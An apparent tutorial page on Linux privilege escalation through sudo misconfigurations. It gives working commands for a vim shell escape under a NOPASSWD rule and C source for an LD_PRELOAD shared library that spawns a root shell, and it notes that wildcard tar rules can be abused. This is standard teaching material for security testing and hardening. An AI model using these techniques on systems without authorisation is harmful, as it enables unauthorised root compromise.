`sudo` is meant to grant *narrow*, audited privilege. In practice, rules are
often broader than intended. The first move is always the same:

```bash title="What can I run?"
sudo -l
```

This lists the commands the current user may run via sudo, and under which
account. Read every line carefully — the escalation is usually right there.

## NOPASSWD on a shell-spawner

```ansi title="sudo -l output"
User www-data may run the following commands on web01:
    (root) NOPASSWD: /usr/bin/vim
```

`vim` can drop to a shell, and here it runs as root with no password:

```bash title="Escape to a root shell"
sudo vim -c ':!/bin/sh'
```

Any binary that can execute commands — editors, pagers, interpreters,
`awk`, `find` — becomes a root shell when allowed via sudo. GTFOBins lists the
exact escape for each.

## LD_PRELOAD via env_keep

If the sudoers policy preserves environment variables, you may be able to inject
a shared library that runs as root:

```ansi title="A dangerous env_keep"
env_keep+=LD_PRELOAD
```

Compile a small library whose constructor spawns a shell, then preload it into
any command you're allowed to run with sudo:

```c title="evil.c"
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0); setuid(0);
  execl("/bin/sh", "sh", NULL);
}
```

```bash title="Build and trigger"
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so <allowed-command>
```

<Callout type="warning" title="Wildcards are footguns">
  A rule like <code>(root) /usr/bin/tar -czf /backups/* </code> with a wildcard
  can often be abused with <code>tar</code>'s
  <code>--checkpoint-action</code> to run arbitrary commands. Treat any
  wildcard in a sudoers rule as a likely escalation path.
</Callout>

## Recap

- Always start with `sudo -l`.
- Shell-spawning binaries allowed via sudo are direct root.
- `env_keep` (especially `LD_PRELOAD`) and wildcard arguments are common, subtle
  misconfigurations.
